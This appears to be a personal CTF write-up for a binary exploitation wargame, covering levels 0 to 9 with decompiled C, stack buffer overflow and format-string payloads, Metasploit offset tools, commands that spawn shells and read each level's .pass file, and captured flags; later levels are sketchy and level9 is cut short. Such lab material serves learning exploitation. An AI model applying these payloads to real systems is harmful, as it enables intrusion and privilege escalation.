---
tags: []
Links: []
Created: 2023-12-04 15:34
---
# level0

Simplified decompiled binary:

```c
int main(int argc,char *argv[])

{
  int iVar1;
  char *local_20;
  
  iVar1 = atoi(argv[1]);
  if (iVar1 == 423) {
    local_20 = strdup("/bin/sh");
    execv("/bin/sh",&local_20);
  }
  else {
    fwrite("No !\n",1,5,(FILE *)stderr);
  }
  return 0;
}
```

Here we see we have to access the `execve` to get a shell as `level1`, and we can do that by making sure `argv[1] = 423`.

So we can just do:

```bash
./level0 423
cat /home/user/level1/.pass
```

Flag: `1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a`

# level1

Decompiling the program we find a buffer overflow, since we use `gets` on a buffer with a limited size:
```c
void run(void)
{
  fwrite("Good... Wait what?\n",1,0x13,stdout);
  system("/bin/sh");
  return;
}

void main(void)
{
  char local_50 [76];
  gets(local_50);
  return;
}
```

So what we can do here is changing the return address of the main in the stack, making it return to `run()` instead of the normal return.

We therefore need to find the address of `run()` with `objdump`: 
```bash
objdump -d level1
```

Output: 
```bash
08048444 <run>:
```

And transform it to little endian and hex format:
```
\x44\x84\x04\x08
```
Finally, we need to generate a big enough number of backfill characters to cause the overflow:
```bash
python -c 'print("A" * 76)'
```

The payload now looks like this:

```bash
python -c 'print("A" * 76 + b"\x44\x84\x04\x08")'
```

Last problem though, the shell opened is not interactive and returns immediately. We need to keep the ouput open using cat:
```bash
(python -c 'print("A" * 76 + b"\x44\x84\x04\x08")'; cat) | ./level1
```

Flag: `53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77`

Reference: [Buffer Overflow Examples, Overwriting a function pointer - protostar stack3 - 0xRick’s Blog](https://0xrick.github.io/binary-exploitation/bof3/)
# level2

```c
void p(void)
{
  uint address;
  char local_50 [76];
  
  fflush(stdout);
  gets(local_50);
  if ((address & 0xb0000000) == 0xb0000000) {
    printf("(%p)\n",address);
    _exit(1);
  }
  puts(local_50);
  strdup(local_50);
  return;
  // shell code
}

void main(void)
{
  p();
  return;
}
```

On this level, we can see that we don't have any function susceptible to open us a shell. Time to inject shellcode !

Let's first determine what's the offset our program will crash at. For that purpose, we can use [[Metasploit]] tools:

```bash
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
```

This will create a payload full of unique character sequences, which will help us determine the exact position our program crashed at. 

Reference: [Buffer Overflow Examples, Code execution by shellcode injection - protostar stack5 - 0xRick’s Blog](https://0xrick.github.io/binary-exploitation/bof5/)

![[Pasted image 20231205125619.png]]

On the bottom, we can see the buffer address where the program crashed: `37634136`

We can therefore give it to another Metasploit program to determine the offset:

```bash
/usr/share/metasploit-framework/tools/exploit/./pattern_offset.rb -q 37634136
[*] Exact match at offset 80
```

We now need to find the address we want 

Now when we run the program with 80 characters, the behavior changes:

```bash
python -c "print ('A'*80 + '\x28\xf7\xff\xbf')" | ./level2 
(0xbffff728)
```

We can successfully overwrite `eip` here:

![[Pasted image 20231211133102.png]]

Now that we did that, we need to make sure `eip` points to somewhere in our shellcode. Since no [[ASLR]] happens here, we could just determine the address where our shellcode starts.

`492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02`



# level3

```c
void v(void)
{
  char buffer [520];

  fgets(buffer,512,stdin);
  printf(buffer);
  if (m == 64) {
    fwrite("Wait what?!\n",1,12,stdout);
    system("/bin/sh");
  }
  return;
}

void main(void)
{
  v();
  return;
}
```

Address of m: `0x0804988c`
              `\x8c\x98\x04\x08`
[Exploit 101 - Format Strings - BreakInSecurity](https://axcheron.github.io/exploit-101-format-strings/)

./level3 
AAAA %x %x %x %x %x %x %x %x %x %x 
AAAA 200 b7fd1ac0 b7ff37d0 `41414141` 20782520 25207825 78252078 20782520 25207825 78252078 
                            ^ AAAA

python -c "print '\x8c\x98\x04\x08'+'%x %x %x %x'" | ./level3
�200 b7fd1ac0 b7ff37d0 `804988c`

(python -c 'print "\x8c\x98\x04\x08" + ("A" * 60) + "%4$n"' ; cat) | ./level3

`b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa`

# level4

12 = offset %x %x %x....

python -c 'print "\x10\x98\x04\x08" + "%16930112x%12$n"'| ./level4

```c
void n(void)
{
  char local_20c [520];
  
  fgets(local_20c,0x200,stdin);
  p(local_20c);
  if (m == 16930116) {
    system("/bin/cat /home/user/level5/.pass");
  }
  return;
}

void main(void)
{
  n();
  return;
}

```

`0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a`

# level5
o = 080484a4 -> 134513828
exit = *0x8049838

python -c 'print "\x38\x98\x04\x08" + "%134513824x%4$n"' | ./level5
                                        ^^^^^^^^^ o - 4
`d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31`

# level6

```c
void n(void) // 08048454
{
  system("/bin/cat /home/user/level7/.pass");
  return;
}

void m(void *param_1, int param_2, char *param_3, int param_4, int param_5) // 08048468
{
  puts("Nope");
  return;
}

void main(int argc, char **argv)
{
  char *vuln;
  void **func;
  
  vuln = (char *)malloc(64);
  func = (void **)malloc(4);
  *func = m;
  strcpy(vuln, argv[1]);
  (**func)();
  return;
}
```

./level6 $(python /tmp/exploit.py)

`f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d`

# level7

```c
void m()
{
  time_t time;
  
  time = time((time_t *)0x0);
  printf("%s - %d\n", c, time);
  return;
}

int main(int argc, char **argv)

{
  char *str1;
  void *ptr1;
  char *str2;
  FILE *flag;
  
  str1 = (char *)malloc(8);
  *str1 = 1;

  ptr1 = malloc(8);
  str1[1] = ptr1;

  str2 = (char *)malloc(8);
  *str2 = 2;
  ptr1 = malloc(8);
  str2[1] = ptr1;

  strcpy((char *)str1[1], argv[1]);
  strcpy((char *)str2[1], argv[2]);

  flag = fopen("/home/user/level8/.pass","r");

  fgets(c, 68, flag);

  puts("~~"); // 
  return 0;
}
```
Just like level5

```bash
./level7 $(python -c 'print "A" * 20 + "\x28\x99\x04\x08"') $(python -c 'print "\xf4\x84\x04\x08"') 
```
flag: `5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9`

# level8

Il faut :

`auth    `

`service`

`service`

`login`


car  if (auth[8] == 0) donc last char de auth != 0

et faut pas que avant de faire login l'adresse de l'input + 32 -> (32 = 2 * 16) == output

service + 0x10 = 16

gdb> disass main

   0x08048625 <+193>:	cmp    eax,0x1e donc 31, donc il faut 2 service pour >= 32

`c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a`

# level9

_ZN1N13setAnnotationEPc -> N::setAnnotation

